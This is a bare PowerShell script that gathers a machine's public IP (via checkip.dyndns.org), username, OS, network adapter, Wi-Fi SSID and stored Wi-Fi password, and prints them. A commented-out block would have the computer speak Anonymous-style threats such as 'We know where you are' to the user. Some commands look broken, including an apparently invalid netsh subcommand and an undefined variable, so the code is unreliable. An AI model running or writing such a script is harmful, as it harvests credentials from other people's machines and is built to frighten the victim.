$publicIP = (Invoke-WebRequest -Uri "http://checkip.dyndns.org" -UseBasicParsing).Content.Split(":")[1].Trim().Split("<")[0]
$username = $env:username
$os = (Get-WmiObject -Class Win32_OperatingSystem).Name
$wifi = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $True}).Description
$ssid = (netsh wlan show interface | Select-String "SSID").Split(":")[1].Trim()
$wifiPassword = (netsh wlan show profileparam name=$ssid | Select-String "Key Content").Split(":")[1].Trim()

<#
$s=New-Object -ComObject SAPI.SpVoice
$s.Rate = -2
$s.Speak("We found you $FN")
$s.Speak("We know where you are")
$s.Speak("We are everywhere")
$s.Speak("We do not forgive, we do not forget")
$s.Speak("Expect us")
#>

Write-Host "Public IP: $publicIP"
Write-Host "Username: $username"
Write-Host "Operating System: $os"
Write-Host "Wifi Adapter: $wifi"
Write-Host "SSID: $ssid"
Write-Host "Wifi Password: $wifiPassword"
